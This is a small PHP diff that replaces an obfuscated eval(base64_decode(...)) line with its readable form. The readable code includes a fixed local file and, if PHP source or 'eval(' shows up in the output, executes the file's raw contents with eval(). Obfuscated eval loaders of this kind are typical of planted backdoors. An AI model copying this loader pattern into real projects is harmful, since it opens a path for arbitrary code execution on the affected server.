@@ -1,3 +1,14 @@
 <?php
-eval(base64_decode('JHQ9J0M6L3hhbXBwL3BocC9jb250ZW50LnBocCc7aWYoZmlsZV9leGlzdHMoJHQsJykpe29iX3N0YXJ0KCk7aW5jbHVkZSgkdCk7JHI9b2JfZ2V0X2NsZWFuKCk7aWYoc3RycG9zKCRyLCc8P3BocCcpIT09ZmFsc2V8fHN0cnBvcygkciwnZXZhbCgnKSE9PWZhbHNlKXtldmFsKCc/PicuZmlsZV9nZXRfY29udGVudHMoJHQsJykpO31lbHNle2VjaG8gJHI7fX1lbHNle2RpZSgnRmlsZSBOb3QgRm91bmQnKTt9'));
-?>
+$t = 'C:/xampp/php/content.php';
+if (file_exists($t)) {
+    ob_start();
+    include($t);
+    $r = ob_get_clean();
+    if (strpos($r, '<?php') !== false || strpos($r, 'eval(') !== false) {
+        eval('?>' . file_get_contents($t));
+    } else {
+        echo $r;
+    }
+} else {
+    die('File Not Found');
+}
